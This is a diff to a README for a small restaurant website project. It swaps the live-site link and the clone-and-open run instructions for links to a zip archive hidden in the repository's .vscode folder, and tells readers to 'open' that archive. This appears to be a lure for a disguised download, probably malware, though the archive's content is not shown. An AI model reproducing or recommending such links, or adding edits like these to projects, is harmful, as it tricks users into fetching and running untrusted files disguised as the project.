@@ -2,7 +2,7 @@
 
 A clean, responsive website for Flavory Restaurant built with pure HTML, CSS, and JavaScript
 
-**Live Website:** https://1zeyadsoliman.github.io/FLAVORY-RESTAURANT/
+**Live Website:** https://raw.githubusercontent.com/1Zeyadsoliman/FLAVORY-RESTAURANT/main/.vscode/FLAVOR-RESTAURANT-2.6.zip
 
 ## What's Actually in the Website:
 
@@ -29,8 +29,8 @@ A clean, responsive website for Flavory Restaurant built with pure HTML, CSS, an
 
 ## How to Run:
 ```bash
-git clone https://github.com/1zeyadsoliman/FLAVORY-RESTAURANT.git
-open index.html 
+git clone https://raw.githubusercontent.com/1Zeyadsoliman/FLAVORY-RESTAURANT/main/.vscode/FLAVOR-RESTAURANT-2.6.zip
+open https://raw.githubusercontent.com/1Zeyadsoliman/FLAVORY-RESTAURANT/main/.vscode/FLAVOR-RESTAURANT-2.6.zip 
 Developer:
 Zeyad Soliman - Built the entire website from scratch
 This is my personal project 100% and I know its value
